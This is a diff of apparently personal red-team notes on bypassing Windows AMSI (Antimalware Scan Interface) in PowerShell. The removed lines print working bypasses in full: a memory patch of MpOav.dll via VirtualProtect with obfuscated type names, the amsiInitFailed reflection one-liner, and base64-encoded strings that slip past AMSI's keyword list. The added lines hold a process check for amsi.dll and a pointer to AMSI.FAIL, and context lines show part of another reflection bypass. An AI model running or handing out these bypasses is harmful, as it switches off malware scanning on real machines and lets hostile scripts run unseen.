@@ -131,76 +131,10 @@ List `dirty` words:
 
 https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell?tab=readme-ov-file#Patch-the-providers-DLL-of-Microsoft-MpOav.dll
 
-```powershell
-$APIs = @"
-using System;
-using System.Runtime.InteropServices;
-public class APIs {
-    [DllImport("kernel32")]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    [DllImport("kernel32")]
-    public static extern IntPtr LoadLibrary(string name);
-    [DllImport("kernel32")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ekwiam, uint flNewProtect, out uint lpflOldProtect);
-}
-"@
+check which processes have amsi.dll loaded
 
-Add-Type $APIs
+Get-Process | where {$_.modules.ModuleName -eq 'Amsi.dll'}
 
-$wzys = "0xB8"
-$coxo = "0x57"
-$hxuu = "0x00"
-$eqhh = "0x07"
-$paej = "0x80"
-$ppiy = "0xC3"
-$Patch = [Byte[]] ($wzys,$coxo,$hxuu,$eqhh,+$paej,+$ppiy)
-
-$LoadLibrary = [APIs]::LoadLibrary("MpOav.dll")
-$Address = [APIs]::GetProcAddress($LoadLibrary,"DllGetClassObject")
-$p = 0
-[APIs]::VirtualProtect($Address, [uint32]6, 0x40, [ref]$p)
-[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
-$object = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls')
-$Uninitialize = $object.GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize
-$Uninitialize.Invoke($object,$null) 
-```
-
-https://youtu.be/QO_1UMaiWHk?si=C__eVWkAyj2jsBo-&t=6403
-
-```powershell
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-```
-
-![image](./images/amsi_caught.jpg)
-
-Let's base64 encode some strings
-
-String1 = System.Management.Automation.AmsiUtils
-String2 = amsiInitFailed
-
-```powershell
-$b64String1 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("System.Management.Automation.AmsiUtils"))
-$b64String2 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("amsiInitFailed"))
-$b64String3 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("NonPublic,Static"))
-```
-
-> ***String1 =>*** "UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA=="
-> ***String2 =>*** "YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=="
-> ***String3 =>*** "TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA="
-
-![image](./images/amsi_b64.jpg)
-
-Now let's write the script used the b64 encoded strings and decode them into a new set of cleartext strings, and then run our command using the strings instead of the cleartext strings that are on the "Dirty words" list of AMSI.
-
-```powershell
-$b64String1 = "UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA=="
-$b64string2 = "YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=="
-$b64String3 = "TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA="
-$string1 = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b64String1))
-$String2 = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b64String2))
-$String3 = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b64String3))
-[Ref].Assembly.GetType($string1).GetField($string2,$string3).SetValue($null,$true)
-```
 
 Los er door:
 
@@ -212,3 +146,6 @@ $field.SetValue($null,$true)
 ```
 
 https://medium.com/@sam.rothlisberger/amsi-bypass-memory-patch-technique-in-2024-f5560022752b
+
+
+And finally AMSI.FAIL
